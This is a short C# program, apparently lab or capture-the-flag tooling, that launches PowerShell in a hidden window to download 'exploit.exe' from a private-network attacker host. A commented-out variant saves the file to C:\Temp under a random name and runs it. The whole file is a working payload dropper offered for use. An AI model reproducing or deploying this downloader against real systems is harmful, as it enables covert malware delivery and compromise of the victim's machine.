using System;
using System.Diagnostics;
// this is the shitty script
namespace payload
{
	class Run
	{
		public Run()
		{
			System.Diagnostics.Process process = new System.Diagnostics.Process();
			System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();

			startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
			startInfo.FileName = "powershell.exe";

			Random rand = new Random();
			string saveFileName = "";

			for (int i = 0; i < 8; i++)
			{

				// Generating a random number. 
				int randValue = rand.Next(0, 26);

				// Generating random character by converting 
				// the random number into character. 
				char letter = Convert.ToChar(randValue + 65);

				// Appending the letter to string. 
				saveFileName += letter;
			}

			saveFileName += ".exe";

			//startInfo.Arguments = "iwr http://10.10.14.162:80/exploit.exe -outfile C:\\Temp\\" + saveFileName + "; C:\\Temp\\" + saveFileName;
			startInfo.Arguments = "Invoke-WebRequest 'http://10.10.14.2:80/exploit.exe'";

			process.StartInfo = startInfo;
			process.Start();
		}

		public static void Main(String[] args)
		{
			Run exploit = new Run();
		}
	}
}
